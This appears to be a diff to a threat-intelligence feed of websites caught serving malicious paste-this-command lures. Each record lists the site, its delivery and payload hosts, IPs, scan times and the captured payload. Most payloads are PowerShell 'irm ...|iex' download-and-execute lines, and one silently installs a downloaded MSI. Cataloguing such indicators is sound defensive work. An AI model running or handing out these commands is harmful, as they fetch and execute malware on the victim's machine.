@@ -1,5 +1,146 @@
 [
   {
+    "UrlDomain": "eastwoodchurch.com",
+    "DeliveryUrl": [
+      "img-codes-cloude.info",
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/zaffsru9nl/3f5a6d13ba8f4f3d"
+    ],
+    "IP": [
+      "160.153.0.207"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/zaffsru9nl/3f5a6d13ba8f4f3d')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/zaffsru9nl/3f5a6d13ba8f4f3d"
+    ],
+    "ReportId": "cmwv1x36l0b8l0nmlxoggkbf7",
+    "ScannedAt": "2026-11-24T18:51:59.509000+00:00"
+  },
+  {
+    "UrlDomain": "save-money-explore-future.netlify.app",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/ki9ao4wpdn/3d32e71b41be6ac2"
+    ],
+    "IP": [
+      "63.176.8.218"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/ki9ao4wpdn/3d32e71b41be6ac2')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/ki9ao4wpdn/3d32e71b41be6ac2"
+    ],
+    "ReportId": "cmwv1s4cm0azn0nmlkv8b9b53",
+    "ScannedAt": "2026-11-24T18:48:07.730000+00:00"
+  },
+  {
+    "UrlDomain": "snocapdrivein.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "192.241.159.152"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads"
+    ],
+    "ReportId": "cmwv1qxno0ayg0nmlh2cufokm",
+    "ScannedAt": "2026-11-24T18:47:12.299000+00:00"
+  },
+  {
+    "UrlDomain": "finomes.com",
+    "DeliveryUrl": [
+      "dakiloifhsnuukka.com",
+      "undatepu.com"
+    ],
+    "PayloadUrl": [
+      "https://undatepu.com/x"
+    ],
+    "IP": [
+      "93.127.179.230"
+    ],
+    "Related": [],
+    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"https://undatepu[.]com/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
+    "ResolvedDownloadUrl": [
+      "https://undatepu.com/x"
+    ],
+    "ReportId": "cmwv1pfr90awr0nmllw1gkrif",
+    "ScannedAt": "2026-11-24T18:46:02.559000+00:00"
+  },
+  {
+    "UrlDomain": "www.berlinabodyworks.com.au",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "103.73.65.63"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads"
+    ],
+    "ReportId": "cmwv192j40a6w0nmlj896hnz4",
+    "ScannedAt": "2026-11-24T18:33:18.921000+00:00"
+  },
+  {
+    "UrlDomain": "ridoycreative.infinityfreeapp.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [
+      "https://lmabagas.com/saykatproliv1/3e8978c0fb378d8a",
+      "https://lmabagas.com/saykatproliv1/249b8827a3fac502",
+      "https://lmabagas.com/saykatproliv1/32aa3d6793f509a2"
+    ],
+    "IP": [
+      "185.27.134.55"
+    ],
+    "Related": [
+      {
+        "Value": "fingerprint-veri.info",
+        "Type": "Discovered"
+      }
+    ],
+    "Payload": "powershell -w h \"iex(irm \\'fingerprint-veri[.]info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmwv18snu0a6b0nmlpoa09xzd",
+    "ScannedAt": "2026-11-24T18:33:06.136000+00:00"
+  },
+  {
+    "UrlDomain": "clinic9sa.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "63.247.87.146"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads"
+    ],
+    "ReportId": "cmwv13k540a270nmlwilsz750",
+    "ScannedAt": "2026-11-24T18:29:01.801000+00:00"
+  },
+  {
     "UrlDomain": "efi-lystfiskergrej.dk",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -20779,27 +20920,5 @@
     ],
     "ReportId": "cmwb2fd2s00g10nmllb1yc2q6",
     "ScannedAt": "2026-11-10T19:10:48.567000+00:00"
-  },
-  {
-    "UrlDomain": "dgzverandas.nl",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "46.202.158.31"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/fd9aaadbb95356a1",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/fd9aaadbb95356a1'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/fd9aaadbb95356a1"
-    ],
-    "ReportId": "cmwb12w7t00dj0nmlk3hyfwh0",
-    "ScannedAt": "2026-11-10T18:33:07.281000+00:00"
   }
 ]
